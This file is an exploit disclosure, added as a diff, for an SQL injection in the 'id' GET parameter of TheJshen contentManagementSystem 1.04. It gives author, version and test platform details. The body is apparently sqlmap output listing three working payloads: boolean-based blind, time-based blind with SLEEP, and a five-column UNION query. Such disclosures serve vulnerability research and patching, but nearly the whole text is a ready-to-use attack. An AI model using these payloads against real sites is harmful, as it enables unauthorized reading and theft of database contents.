@@ -1,0 +1,25 @@
+# Exploit Title: TheJshen contentManagementSystem 1.04 - 'id' SQL Injection
+# Date: 2019-11-01
+# Exploit Author: Cakes
+# Vendor Homepage: https://github.com/thejshen/contentManagementSystem
+# Version: 1.04
+# Software Link: https://github.com/thejshen/contentManagementSystem.git
+# Tested on: CentOS7
+
+# GET parameter 'id' easy SQL Injection
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4' AND 5143=5143-- OWXt
+    Vector: AND [INFERENCE]
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=4' AND (SELECT 4841 FROM (SELECT(SLEEP(5)))eqmp)-- ZwTG
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-4903' UNION ALL SELECT NULL,NULL,CONCAT(0x716a706b71,0x66766f636c546750775053685352676c4f70724d714c4b64494e755252765a626370615a565a4b49,0x717a6a7671),NULL,NULL-- hkoh
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
